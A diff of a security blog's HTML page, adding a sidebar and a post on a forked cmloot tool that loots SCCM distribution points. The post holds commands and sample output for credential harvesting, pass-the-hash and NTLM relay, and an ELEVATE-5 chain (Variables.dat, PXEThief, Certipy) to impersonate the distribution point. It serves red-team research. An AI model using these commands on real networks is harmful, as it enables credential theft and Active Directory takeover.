@@ -21,131 +21,337 @@
 
   <canvas id="matrix-bg"></canvas>
 
-  <nav id="topbar" class="topbar hidden">
-    <div class="nav-container">
-      <a href="{{ '/' | relative_url }}#home" class="logo-link">
-        <img src="{{ '/assets/images/favicon.png' | relative_url }}" alt="logo" />
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-logo">
+      <div class="hex-logo">
+        <img src="{{ '/assets/images/favicon.png' | relative_url }}" alt="h4ck3r.be" />
+      </div>
+      <span class="logo-text">h4ck3r.be</span>
+    </div>
+    <nav class="sidebar-nav">
+      <a href="#home" class="sidebar-link active" data-nav="home">
+        <span class="sidebar-icon">&#9650;</span> Home
       </a>
-      <ul class="nav-links">
-        <li><a href="#Blog">Blog</a></li>
-        <li><a href="#Arsenal">Arsenal</a></li>
-      </ul>
+      <a href="#Blog" class="sidebar-link" data-nav="Blog">
+        <span class="sidebar-icon">&#9998;</span> Blog
+      </a>
+      <a href="#Arsenal" class="sidebar-link" data-nav="Arsenal">
+        <span class="sidebar-icon">&#9876;</span> Arsenal
+      </a>
+    </nav>
+    <div class="sidebar-footer">
+      <a href="https://github.com/Inzynx" class="sidebar-gh" target="_blank" rel="noopener">GitHub</a>
     </div>
-  </nav>
+  </aside>
 
-  <img class="bg-logo" src="{{ '/assets/images/favicon.png' | relative_url }}" alt="bg">
+  <button id="sidebar-toggle" class="sidebar-toggle" aria-label="Toggle sidebar">
+    <span></span><span></span><span></span>
+  </button>
 
-  <div class="content-wrapper" id="home">
-    <div id="typed-text" class="typewriter"></div>
-    <div id="typed-subtitle" class="typewriter"></div>
-    <div id="nav-buttons">
-      <a href="#Blog" class="hacker-btn" data-section="Blog">BLOG</a>
-      <a href="#Arsenal" class="hacker-btn" data-section="Arsenal">ARSENAL</a>
-    </div>
-  </div>
+  <main id="main-content" class="main-content">
 
-  <section id="Blog" class="page-section hidden">
-    <h2 class="section-title">Blog</h2>
-    <div class="terminal-window">
-      <div class="terminal-header">
-        <span class="terminal-dot red"></span>
-        <span class="terminal-dot yellow"></span>
-        <span class="terminal-dot green"></span>
-        <span class="terminal-title">h4ck3r@blog:~$</span>
-      </div>
-      <div class="terminal-body">
-        <p><span class="prompt">$</span> cat mission.txt</p>
-        <p class="output">Breaking things to understand them. Sharing what we learn so the community gets stronger.</p>
-        <p><span class="prompt">$</span> cat focus.txt</p>
-        <p class="output">Red teaming &bull; Penetration testing &bull; Malware research &bull; Reverse engineering &bull; Threat intelligence &bull; Community-driven writeups</p>
-        <p><span class="prompt">$</span> cat philosophy.txt</p>
-        <p class="output">Understand the attack to build the defense. Break things responsibly. Share knowledge freely. Lift others up.</p>
-        <p><span class="prompt">$</span> ls posts/</p>
-        <p class="output"><a href="#post-cmloot" class="blog-link">cmloot - Forked, Extended, and Weaponized</a></p>
-        <p><span class="prompt">$</span> _<span class="cursor-block"></span></p>
+    <img class="bg-logo" src="{{ '/assets/images/favicon.png' | relative_url }}" alt="bg">
+
+    <div class="content-wrapper" id="home">
+      <div id="typed-text" class="typewriter"></div>
+      <div id="typed-subtitle" class="typewriter"></div>
+      <div id="nav-buttons">
+        <a href="#Blog" class="hacker-btn">BLOG</a>
+        <a href="#Arsenal" class="hacker-btn">ARSENAL</a>
       </div>
     </div>
-  </section>
 
-  <article id="post-cmloot" class="page-section hidden blog-post">
-    <a href="#Blog" class="back-link">&larr; Back to Blog</a>
-    <h2 class="section-title">cmloot &mdash; Forked, Extended, and Weaponized</h2>
-    <div class="terminal-window">
-      <div class="terminal-header">
-        <span class="terminal-dot red"></span>
-        <span class="terminal-dot yellow"></span>
-        <span class="terminal-dot green"></span>
-        <span class="terminal-title">h4ck3r@cmloot:~$</span>
+    <section id="Blog" class="page-section hidden">
+      <h2 class="section-title">Blog</h2>
+      <p class="section-subtitle">Research writeups, tool breakdowns, and offensive deep dives.</p>
+      <div class="blog-grid">
+        <a href="#post-cmloot" class="blog-card">
+          <div class="blog-card-tag">SCCM</div>
+          <h3>cmloot &mdash; Forked, Extended, and Weaponized</h3>
+          <p>What changed, what was added, and why every improvement matters when you are 10 hops deep in an SCCM environment.</p>
+          <div class="blog-card-meta">
+            <span>2026-06-04</span>
+            <span class="tag-sev">CRITICAL</span>
+          </div>
+        </a>
       </div>
-      <div class="terminal-body">
-        <p><span class="prompt">$</span> whoami</p>
-        <p class="output">A fork of <a href="https://github.com/shelltrail/cmloot" class="inline-link" target="_blank" rel="noopener">shelltrail/cmloot</a> &mdash; the SCCM Content Library enumeration and extraction tool by <a href="https://www.shelltrail.com/research/cmloot/" class="inline-link" target="_blank" rel="noopener">Andreas Vikerup / Shelltrail</a>.</p>
+    </section>
 
-        <p><span class="prompt">$</span> diff upstream.md fork.md</p>
-        <p class="output"><strong>The original cmloot</strong> does one thing well: it connects to an SCCM Distribution Point over SMB, traverses <code>SCCMContentLib$</code>, and downloads files by extension. Clean, effective, and no-frills.</p>
-        <p class="output"><strong>This fork</strong> takes that foundation and turns it into a full offensive pipeline. Here is what changed:</p>
+    <article id="post-cmloot" class="page-section hidden blog-post">
+      <div class="post-layout">
+        <div class="post-content">
+          <a href="#Blog" class="back-link">&larr; Back to Blog</a>
+          <h2 class="section-title">cmloot &mdash; Forked, Extended, and Weaponized</h2>
+      <p class="post-intro">This is a fork of <a href="https://github.com/shelltrail/cmloot" class="inline-link" target="_blank" rel="noopener">shelltrail/cmloot</a> by <a href="https://www.shelltrail.com/research/cmloot/" class="inline-link" target="_blank" rel="noopener">Andreas Vikerup</a>. The original connects to an SCCM Distribution Point over SMB, traverses <code>SCCMContentLib$</code>, and downloads files by extension &mdash; a solid foundation. This fork builds on that foundation with six additions that turn a file grabber into a complete offensive pipeline: BFS inventory with progress, interactive download selection, an auto-discover-to-classify pipeline, offline file classification, credential deep analysis, and ELEVATE-5 DP takeover support. Here is what changed and why each addition matters in the field.</p>
 
-        <p><span class="prompt">$</span> cat additions.txt</p>
-        <p class="output highlight">[!] BFS Inventory with Progress</p>
-        <p class="output">The original walked the share sequentially with no visibility. The fork uses BFS traversal with progress bars, ETA, and per-directory file counts so you know what is happening and how long to wait.</p>
-        <p class="output highlight">[!] Interactive Download Selection</p>
-        <p class="output">Instead of blindly downloading everything matching an extension, the fork shows you a prioritized table (file size, category, priority markers) and lets you pick which files to grab. No more wasting time on 4 GB install.wim files when you only need boot.wim.</p>
-        <p class="output highlight">[!] Auto Pipeline</p>
-        <p class="output">One flag &mdash; <code>-auto</code> &mdash; runs LDAP discovery, inventory, download, and classification in sequence. Point it at a DC and walk away.</p>
-        <p class="output highlight">[!] File Classification</p>
-        <p class="output">Downloaded files are categorized offline: credentials, OSD media, config files, scripts, certificates, and more. High-value targets get <code>[!]</code> markers so you immediately see what matters.</p>
-        <p class="output highlight">[!] cmloot_analyze.py &mdash; Credential Deep Dive</p>
-        <p class="output">A separate scanner that runs over downloaded loot and surfaces plaintext passwords, PSCredential usage, connection strings, private keys, API tokens, LDAP paths, service accounts &mdash; filtered, deduplicated, and rated by severity (CRITICAL / HIGH / MEDIUM). Supports JSON output for pipeline integration.</p>
-        <p class="output highlight">[!] ELEVATE-5: Distribution Point Takeover</p>
-        <p class="output">The fork adds <code>-elevate5</code> to extract <code>Variables.dat</code> from downloaded WIM boot images. Combined with <a href="https://github.com/MWR-CyberSec/PXEThief" class="inline-link" target="_blank" rel="noopener">PXEThief</a> you can decrypt the embedded PKI certificate (Client Auth EKU, exportable private key) and authenticate as the DP machine account via <a href="https://github.com/ly4k/Certipy" class="inline-link" target="_blank" rel="noopener">Certipy</a>. Full AD compromise from a single misconfigured DP.</p>
-        <p class="output highlight">[!] More Auth Options</p>
-        <p class="output">Pass-the-hash (<code>-hashes</code>), computer account auth (<code>-no-pass</code>), Kerberos (<code>-k</code>), and NTLM relay via proxychains &mdash; all carried over from upstream, now with cleaner argument handling.</p>
+      <table class="compare-table">
+        <thead>
+          <tr>
+            <th>Capability</th>
+            <th class="upstream-col">Original</th>
+            <th class="fork-col">Fork</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>SMB traversal &amp; download</td>
+            <td class="upstream-col">Yes</td>
+            <td class="fork-col">Yes (improved)</td>
+          </tr>
+          <tr>
+            <td>LDAP discovery</td>
+            <td class="upstream-col">Yes</td>
+            <td class="fork-col">Yes + multi-target merge</td>
+          </tr>
+          <tr>
+            <td>Progress / ETA</td>
+            <td class="upstream-col">No</td>
+            <td class="fork-col highlight-cell">BFS with progress bars</td>
+          </tr>
+          <tr>
+            <td>Interactive file selection</td>
+            <td class="upstream-col">Download all</td>
+            <td class="fork-col highlight-cell">Pick files by number/range</td>
+          </tr>
+          <tr>
+            <td>Auto pipeline</td>
+            <td class="upstream-col">No</td>
+            <td class="fork-col highlight-cell">-auto (discover &rarr; loot &rarr; classify)</td>
+          </tr>
+          <tr>
+            <td>File classification</td>
+            <td class="upstream-col">No</td>
+            <td class="fork-col highlight-cell">Category + [!] priority markers</td>
+          </tr>
+          <tr>
+            <td>Credential analysis</td>
+            <td class="upstream-col">No</td>
+            <td class="fork-col highlight-cell">cmloot_analyze.py (severity-rated)</td>
+          </tr>
+          <tr>
+            <td>ELEVATE-5 extraction</td>
+            <td class="upstream-col">No</td>
+            <td class="fork-col highlight-cell">-elevate5 (Variables.dat from WIM)</td>
+          </tr>
+          <tr>
+            <td>PtH / Kerberos / relay</td>
+            <td class="upstream-col">Yes</td>
+            <td class="fork-col">Yes (cleaner args)</td>
+          </tr>
+        </tbody>
+      </table>
 
-        <p><span class="prompt">$</span> cat tl_dr.txt</p>
-        <p class="output">Same SMB traversal core. New offensive surface. If you were using the original cmloot, the fork is a drop-in replacement that gives you targeting, classification, credential extraction, and ELEVATE-5 in a single tool.</p>
+      <h3 id="sec-bfs" class="post-heading">BFS Inventory with Progress</h3>
+      <p class="post-text">When you are enumerating a share with thousands of files, sitting in silence for minutes with no feedback is stressful. The original walks <code>SCCMContentLib$</code> sequentially and gives you a single "created" message. This fork uses BFS traversal with per-directory progress bars, running file counts, and an ETA so you can tell whether the tool is still working or has hung on a timeout.</p>
+      <div class="code-compare">
+        <div class="code-compare-side">
+          <span class="code-label">Original</span>
+          <pre class="code-block">[+] Access to SCCMContentLib on sccm01
+[+] sccmfiles.txt created</pre>
+        </div>
+        <div class="code-compare-side">
+          <span class="code-label">Fork</span>
+          <pre class="code-block">[+] Access to SCCMContentLib on sccm01
+[*] Traversing DataLib... ████████████████ 100%  (2,847 files)
+[*] Traversing FileLib... ██████████████░░  82%  (1,204 files, ETA 0:03)
+[+] sccmfiles.txt created (4,051 entries)</pre>
+        </div>
+      </div>
 
-        <p><span class="prompt">$</span> cat links.txt</p>
-        <p class="output"><a href="https://github.com/shelltrail/cmloot" class="inline-link" target="_blank" rel="noopener">Original: shelltrail/cmloot</a> &bull; <a href="https://www.shelltrail.com/research/cmloot/" class="inline-link" target="_blank" rel="noopener">Shelltrail Research</a> &bull; <a href="https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/ELEVATE/ELEVATE-5/ELEVATE-5_description.md" class="inline-link" target="_blank" rel="noopener">ELEVATE-5 Documentation</a></p>
-        <p><span class="prompt">$</span> _<span class="cursor-block"></span></p>
-      </div>
-    </div>
-  </article>
+      <h3 id="sec-download" class="post-heading">Interactive Download Selection</h3>
+      <p class="post-text">The original downloads every file matching your extension list. In practice this means pulling a 4.5 GB <code>install.wim</code> that does not contain any task sequence variables &mdash; wasted time and bandwidth. The fork shows you exactly what is available before you download: file size, category, and a <code>[!]</code> marker for high-value targets. You pick by number or range, and skip the noise.</p>
+      <pre class="code-block">================================================================
+DOWNLOAD SELECTION: 4 files available
+================================================================
 
-  <section id="Arsenal" class="page-section hidden">
-    <h2 class="section-title">Arsenal</h2>
-    <div class="skills-grid">
-      <div class="skill-card">
-        <div class="skill-icon">&#9760;</div>
-        <h3>Offensive Security</h3>
-        <p>Red team operations, AD attacks, lateral movement, C2 infrastructure, social engineering simulations.</p>
+  #    Size       Category                  File
+  ---  ---        ---                       ---
+  1    280KB      OSD MEDIA (ELEVATE-5)     boot.BHS00012.wim [!]
+  2    312MB      OSD MEDIA (ELEVATE-5)     boot.BHS00009.wim [!]
+  3    15KB       CREDENTIALS               BHS-MigApp.xml [!]
+  4    4.5GB      OSD MEDIA (install)        install.wim
+
+  Total: 4.8GB across 4 files
+
+  Select files to download:
+    Numbers: 1,3       Ranges: 1-3       A = all    Q = quit
+  Choice [A]: 1,2,3
+
+[+] Downloading boot.BHS00012.wim (280KB)...
+[+] Downloading boot.BHS00009.wim (312MB)...
+[+] Downloading BHS-MigApp.xml (15KB)...
+[+] Done. 3 files downloaded, 1 skipped (312.3MB total)</pre>
+
+      <h3 id="sec-auto" class="post-heading">Auto Pipeline</h3>
+      <p class="post-text">Normally you run three separate commands: discover SCCM servers, build an inventory, then download. The <code>-auto</code> flag chains those steps together &mdash; LDAP discovery, BFS inventory, interactive download, and offline classification in a single pass. It also handles multi-target enumeration with automatic dedup, so you can point it at a domain controller and walk away.</p>
+      <pre class="code-block">$ python3 cmloot.py corp.local/user:pass@dc01 -auto
+
+[+] LDAP discovery: found 2 SCCM servers
+[+] Inventorying SCCM01... ████████████████ 100%
+[+] Inventorying SCCM02... ████████████████ 100%
+[+] Merged inventory: 6,120 files (deduped)
+[*] Downloading high-value files...
+[+] Downloaded boot.BHS00012.wim (280KB) [OSD MEDIA]
+[+] Downloaded BHS-MigApp.xml (15KB) [CREDENTIALS]
+[+] Downloaded C7F4-MigApp.xml (22KB) [CREDENTIALS]
+[+] Classifying downloaded files...
+[+] Done. 3 files downloaded, 6,117 skipped.</pre>
+
+      <h3 id="sec-classify" class="post-heading">File Classification</h3>
+      <p class="post-text">When you have downloaded hundreds of files, finding the two that actually matter is tedious. The fork classifies every file offline &mdash; credentials, OSD media, configuration, migration data &mdash; and marks high-value targets with <code>[!]</code> so you can immediately pivot instead of sifting through generic XML by hand.</p>
+      <pre class="code-block">$ python3 cmloot.py -classify
+
+  ================================================================
+  CLASSIFIED LOOT — CMLootOut/
+  ================================================================
+
+  [!] CREDENTIALS
+       BHS-MigApp.xml         15KB   [CRITICAL]
+       C7F4-MigApp.xml        22KB   [CRITICAL]
+
+  [!] OSD MEDIA (ELEVATE-5)
+       boot.BHS00012.wim      280KB  [HIGH]
+       boot.BHS00009.wim      312MB  [HIGH]
+       prestaged.wim          8MB    [HIGH]
+
+  [i] CONFIGURATION
+       F906-ep_defaultpolicy.xml  4KB  [MEDIUM]
+       D204-Config_AppsAndSettings.xml  8KB  [LOW]
+
+  [i] MIGRATION
+       CF90-MigDocs.xml       12KB   [LOW]
+       E67A-MigUser.xml       9KB    [LOW]</pre>
+
+      <h3 id="sec-analyze" class="post-heading">Credential Analysis &mdash; cmloot_analyze.py</h3>
+      <p class="post-text">This is something the original does not have. <code>cmloot_analyze.py</code> is a separate deep content scanner that runs over your downloaded loot and surfaces plaintext passwords, PSCredential usage, connection strings with embedded credentials, private keys, API tokens, LDAP paths, and service accounts. It filters noise (GUIDs, Microsoft schema URLs, empty values), deduplicates per file, and rates every finding by severity: CRITICAL, HIGH, or MEDIUM. Output can be JSON for pipeline integration.</p>
+      <pre class="code-block">$ python3 cmloot_analyze.py CMLootOut/ --severity CRITICAL HIGH
+
+  [CRITICAL] BHS-MigApp.xml
+    ├─ Cleartext password: password="W1nt3rM4nt1s!"
+    ├─ Connection string: Server=SCCMDB01.corp.local;User ID=sccm_sa;Password=...
+    └─ Network Access Account: CORP\svc-sccm-naa
+
+  [CRITICAL] C7F4-MigApp.xml
+    ├─ PSCredential / SecureString usage detected
+    └─ Private key material (RSA 2048)
+
+  [HIGH] F906-ep_defaultpolicy.xml
+    ├─ LDAP bind path: LDAP://OU=Workstations,DC=corp,DC=local
+    └─ SCCM site code: BHS
+
+  Summary: 4 CRITICAL, 2 HIGH, 1 MEDIUM</pre>
+
+      <h3 id="sec-elevate5" class="post-heading">ELEVATE-5: Distribution Point Takeover</h3>
+      <p class="post-text">SCCM Distribution Points that use PKI certificates embed them in OSD boot images as <code>_SMSTSMediaPFX</code>. The certificate has Client Authentication EKU with an exportable private key. The fork adds <code>-elevate5</code> to extract <code>Variables.dat</code> from downloaded WIM boot images. Combine this with <a href="https://github.com/MWR-CyberSec/PXEThief" class="inline-link" target="_blank" rel="noopener">PXEThief</a> to decrypt the embedded certificate, then authenticate as the DP machine account via <a href="https://github.com/ly4k/Certipy" class="inline-link" target="_blank" rel="noopener">Certipy</a>. That is full AD compromise from a single misconfigured Distribution Point.</p>
+      <pre class="code-block">Step 1: Download boot images
+  $ python3 cmloot.py corp.local/user@sccm01 -extensions WIM ISO
+
+Step 2: Extract Variables.dat from boot WIM
+  $ python3 cmloot.py -elevate5
+
+  ┌──────────────────────────────────────────────────┐
+  │  ELEVATE-5: PKI Certificate Recovery             │
+  │  ─────────────────────────────────────────────── │
+  │  [+] boot.BHS00012.wim (280KB)                  │
+  │      Extracting Variables.dat... OK              │
+  │      Found: _SMSTSMediaPFX certificate            │
+  │      EKU: Client Authentication                  │
+  │      Key: Exportable                             │
+  │                                                  │
+  │  [-] boot.BHS00009.wim — no Variables.dat found  │
+  │  [-] install.wim — skipped (not a boot image)   │
+  └──────────────────────────────────────────────────┘
+
+Step 3: Decrypt certificate with PXEThief
+  $ python3 pxethief.py 3 Variables.dat
+
+Step 4: Authenticate as DP machine account
+  $ certipy auth -pfx sccm01.pfx</pre>
+      <p class="post-text dim-text">Boot images (<code>boot.*.wim</code>, <code>prestaged.wim</code>) contain <code>Variables.dat</code>. Install images (<code>install.wim</code>) do not. The interactive download in this fork lets you skip the 4.5 GB noise and grab the 280 KB target.</p>
+
+      <h3 id="sec-auth" class="post-heading">Authentication Options</h3>
+      <p class="post-text">The fork carries over all auth methods from upstream with cleaner argument handling: password, pass-the-hash, computer account, Kerberos, and NTLM relay via proxychains.</p>
+      <pre class="code-block"># Password auth
+python3 cmloot.py corp.local/user:pass@sccm01 -cmlootinventory out.txt
+
+# Pass-the-hash
+python3 cmloot.py corp.local/user@sccm01 -cmlootinventory out.txt \
+    -hashes :fc525c9683e8fe067095ba14f29e5f5c
+
+# Computer account
+python3 cmloot.py corp.local/WORKSTN$@sccm01 -cmlootinventory out.txt \
+    -hashes :fc525c9683e8fe067095ba14f29e5f5c -no-pass
+
+# Kerberos
+python3 cmloot.py corp.local/user@sccm01 -k -dc-ip 10.0.0.1
+
+# NTLM relay via proxychains
+ntlmrelayx.py -socks -t 10.0.0.50 -smb2support
+proxychains python3 cmloot.py CORP/WORKSTN$@10.0.0.50 -n \
+    -cmlootdownload out.txt</pre>
+
+      <div class="post-bottom">
+        <p class="post-text">Same SMB traversal core at the foundation, with an extended offensive surface on top. The fork is a drop-in replacement &mdash; all upstream workflows still work, and every new feature is opt-in via flags.</p>
+        <div class="post-links">
+          <a href="https://github.com/Inzynx/cmloot" class="inline-link" target="_blank" rel="noopener">GitHub Repo</a>
+          <a href="https://github.com/shelltrail/cmloot" class="inline-link" target="_blank" rel="noopener">shelltrail/cmloot</a>
+          <a href="https://www.shelltrail.com/research/cmloot/" class="inline-link" target="_blank" rel="noopener">Shelltrail Research</a>
+          <a href="https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/ELEVATE/ELEVATE-5/ELEVATE-5_description.md" class="inline-link" target="_blank" rel="noopener">ELEVATE-5</a>
+          <a href="https://github.com/MWR-CyberSec/PXEThief" class="inline-link" target="_blank" rel="noopener">PXEThief</a>
+          <a href="https://github.com/ly4k/Certipy" class="inline-link" target="_blank" rel="noopener">Certipy</a>
+        </div>
       </div>
-      <div class="skill-card">
-        <div class="skill-icon">&#9776;</div>
-        <h3>Malware Development</h3>
-        <p>Custom loaders, EDR evasion, ntdll unhooking, credential harvesting, shellcode execution frameworks.</p>
+        </div>
+        <nav class="toc">
+          <div class="toc-title">Contents</div>
+          <a href="#sec-bfs" class="toc-link">BFS Inventory</a>
+          <a href="#sec-download" class="toc-link">Interactive Download</a>
+          <a href="#sec-auto" class="toc-link">Auto Pipeline</a>
+          <a href="#sec-classify" class="toc-link">File Classification</a>
+          <a href="#sec-analyze" class="toc-link">Credential Analysis</a>
+          <a href="#sec-elevate5" class="toc-link">ELEVATE-5</a>
+          <a href="#sec-auth" class="toc-link">Auth Options</a>
+        </nav>
       </div>
-      <div class="skill-card">
-        <div class="skill-icon">&#9881;</div>
-        <h3>Reverse Engineering</h3>
-        <p>Binary analysis, unpacking, protocol reversing, firmware analysis, threat actor tool deconstruction.</p>
+    </article>
+
+    <section id="Arsenal" class="page-section hidden">
+      <h2 class="section-title">Arsenal</h2>
+      <div class="skills-grid">
+        <div class="skill-card">
+          <div class="skill-icon">&#9760;</div>
+          <h3>Offensive Security</h3>
+          <p>Red team operations, AD attacks, lateral movement, C2 infrastructure, social engineering simulations.</p>
+        </div>
+        <div class="skill-card">
+          <div class="skill-icon">&#9776;</div>
+          <h3>Malware Development</h3>
+          <p>Custom loaders, EDR evasion, ntdll unhooking, credential harvesting, shellcode execution frameworks.</p>
+        </div>
+        <div class="skill-card">
+          <div class="skill-icon">&#9881;</div>
+          <h3>Reverse Engineering</h3>
+          <p>Binary analysis, unpacking, protocol reversing, firmware analysis, threat actor tool deconstruction.</p>
+        </div>
+        <div class="skill-card">
+          <div class="skill-icon">&#127760;</div>
+          <h3>Web Application Security</h3>
+          <p>OWASP Top 10+, API abuse, authentication bypass, source code review, DAST/SAST.</p>
+        </div>
+        <div class="skill-card">
+          <div class="skill-icon">&#9889;</div>
+          <h3>Infrastructure</h3>
+          <p>Lab environments, C2 staging, phishing infrastructure, DNS/HTTP tunneling, OPSEC-hardened deployments.</p>
+        </div>
+        <div class="skill-card">
+          <div class="skill-icon">&#128737;</div>
+          <h3>Defense &amp; Detection</h3>
+          <p>Sigma rules, YARA signatures, EDR telemetry analysis, threat hunting, purple team exercises.</p>
+        </div>
       </div>
-      <div class="skill-card">
-        <div class="skill-icon">&#127760;</div>
-        <h3>Web Application Security</h3>
-        <p>OWASP Top 10+, API abuse, authentication bypass, source code review, DAST/SAST.</p>
-      </div>
-      <div class="skill-card">
-        <div class="skill-icon">&#9889;</div>
-        <h3>Infrastructure</h3>
-        <p>Lab environments, C2 staging, phishing infrastructure, DNS/HTTP tunneling, OPSEC-hardened deployments.</p>
-      </div>
-      <div class="skill-card">
-        <div class="skill-icon">&#128737;</div>
-        <h3>Defense &amp; Detection</h3>
-        <p>Sigma rules, YARA signatures, EDR telemetry analysis, threat hunting, purple team exercises.</p>
-      </div>
-    </div>
-  </section>
+    </section>
+
+  </main>
 
   <script src="{{ '/assets/js/typewriter.js' | relative_url }}"></script>
 </body>
